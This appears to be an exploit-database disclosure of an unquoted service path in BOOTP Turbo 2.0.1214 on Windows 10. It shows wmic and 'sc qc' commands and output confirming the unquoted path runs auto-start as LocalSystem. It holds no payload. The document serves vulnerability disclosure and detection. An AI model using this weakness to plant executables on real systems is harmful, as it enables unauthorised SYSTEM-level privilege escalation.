@@ -1,0 +1,27 @@
+# Exploit Title: BOOTP Turbo 2.0.1214 - 'BOOTP Turbo' Unquoted Service Path
+# Exploit Author: boku
+# Date: 2020-02-10
+# Vendor Homepage: https://www.weird-solutions.com
+# Software Link: https://www.weird-solutions.com/download/products/bootpt_demo_IA32.exe
+# Version: 2.0.1214
+# Tested On: Windows 10 (32-bit)
+
+C:\Users\user>wmic service get name, pathname, startmode | findstr "BOOTP" | findstr /i /v """
+BOOTP Turbo                               C:\Program Files\BOOTP Turbo\bootpt.exe                                            Auto
+
+C:\Users\user>sc qc "BOOTP Turbo"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: BOOTP Turbo
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\BOOTP Turbo\bootpt.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : BOOTP Turbo
+        DEPENDENCIES       : Nsi
+                           : Afd
+                           : NetBT
+                           : Tcpip
+        SERVICE_START_NAME : LocalSystem
